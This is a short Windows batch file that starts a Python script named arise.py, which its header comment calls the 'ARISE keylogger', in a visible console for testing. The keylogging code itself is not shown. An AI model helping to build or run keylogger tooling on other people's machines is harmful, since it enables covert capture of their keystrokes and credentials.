@echo off
rem ============================================================
rem  ARISE keylogger - start (visible console, for testing)
rem ============================================================
cd /d "%~dp0"
echo [arise] starting with console output...
python arise.py --stdout
pause
